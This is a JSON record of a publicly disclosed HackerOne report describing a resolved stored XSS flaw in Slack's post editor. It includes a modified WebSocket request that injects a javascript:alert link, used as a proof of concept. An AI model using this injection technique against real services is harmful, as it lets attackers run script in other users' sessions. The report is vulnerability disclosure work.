@@ -1,0 +1,113 @@
+{
+  "id": 132104,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzIxMDQ=",
+  "url": "https://hackerone.com/reports/132104",
+  "title": "Stored XSS on team.slack.com using new Markdown editor of posts inside the Editing mode and using javascript-URIs",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-04-18T19:29:54.692Z",
+  "submitted_at": "2016-04-18T19:29:54.692Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fransrosen",
+    "url": "/fransrosen",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 69,
+    "url": "https://hackerone.com/slack",
+    "handle": "slack",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Slack",
+      "twitter_handle": "slackhq",
+      "website": "https://slack.com",
+      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-09-01T01:47:40.659Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-08-02T01:47:31.894Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nI noticed while looking at an old article I made a while ago that some links were actually inserted as `javascript:`-links. Doing some modifications to these actually revealed that inside editing mode, no protection is added for getting arbitrary scripts to run. This means that by catching the modifications for the Web Socket, I was able to create a payload that would trigger on click (only inside Editing mode for some reason).\n\nHere's the vulnerable socket-request I modified to get the payload in:\n\nAs you see in my post, I delete a link, then do a Ctrl+Z to undo it, putting back the link. I then capture that request and modify the request to insert the payload inside the `links` part:\n```\n{\"type\":\"rocket\",\"event\":\"rocket\",\"payload\":{\"mm\":[[\"fi\",[],3,{\"type\":\"unfurl\",\"originalFragment\":{\"_bindings\":{\"attach\":[[]],\"mutation:post\":[[]],\"attached\":[[]],\"detach\":[[]],\"detached\":[[]]},\"_bindingLock\":0,\"_customData\":[],\"_data\":{\"type\":\"p\",\"text\":\"javascript:alert(document.domain%29\",\"tabbing\":0,\"links\":{\"javascript:alert(\\\"XSS\\\"%29\":[0,22]},\"formats\":[]},\"_dom\":null,\"_mutable\":{\"_lock\":0},\"_mutableGuard\":{\"_lock\":0},\"_parent\":null,\"_text\":\"javascript:alert(\\\"XSS\\\"%29\",\"_tabbing\":0,\"_links\":{\"javascript:alert(\\\"XSS\\\"\":{\"_ranges\":[{\"_s\":0,\"_e\":22}]}},\"pendingUnfurls\":[],\"_formats\":{\"b\":{\"_ranges\":[]},\"i\":{\"_ranges\":[]},\"u\":{\"_ranges\":[]},\"strike\":{\"_ranges\":[]},\"code\":{\"_ranges\":[]}}},\"url\":\"javascript:alert(\\\"XSS\\\"%29\"}]],\"r\":19,\"$\":15,\"type\":\"mm\",\"sel\":[[3],0,[3],0]},\"id\":25}\n```\n\nHere's a PoC-image when clicking the link when I'm editing the post in my team:\n{F87107}\n\nAlso, since you're able to get other people to edit it as well, by enabling \"Let others edit this Post\" you can get other people affected in your team. What's also interesting is that when creating a public link, that will be hosted on slack-files.com, there's a catcher for links that does not begin with `^http(s)?:` which is awesome, however, this is not the case when editing a post on the team domain, which is a bit worse, since it's not sandboxed at all.\n\nThis is the link to my team's post:\nhttps://marqueexss.slack.com/files/marqueexss/F0283AA4K/__hello__a_name__n____href__javascript_alert__xss_____you___a_\n\nAlso, here's a link to the public post:\nhttps://slack-files.com/T025M9QPZ-F0283AA4K-2989c27641\nto show you that the link has indeed the `javascript:` uri, however, this little snippet is triggered, which is great:\n```\nif (protocol && /^https?:$/.test(protocol) === false) {\n     e.preventDefault();\n     if (console && typeof console.warn === \"function\") {\n         console.warn(\"not following bad link from a post preview\")\n     }\n}\n```\n(This code is not present in the Edit-mode on the team URL as mentioned above)\n\nPoC-movie is attached showing the complete flow from editing to triggering the XSS. I've also verified that it will trigger for other users in the team if they edit the post. \n\nRegards,\nFrans",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-09-01T01:47:32.090Z",
+  "allow_singular_disclosure_after": -235131618.79869395,
+  "singular_disclosure_allowed": true,
+  "vote_count": 101,
+  "voters": [
+    "lukasreschke",
+    "derision",
+    "iamnoooob",
+    "d1m0ck",
+    "jfran_cbit",
+    "rubyroobs",
+    "hogarth45",
+    "smiegles",
+    "shubs",
+    "niemand_sec",
+    "and 91 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
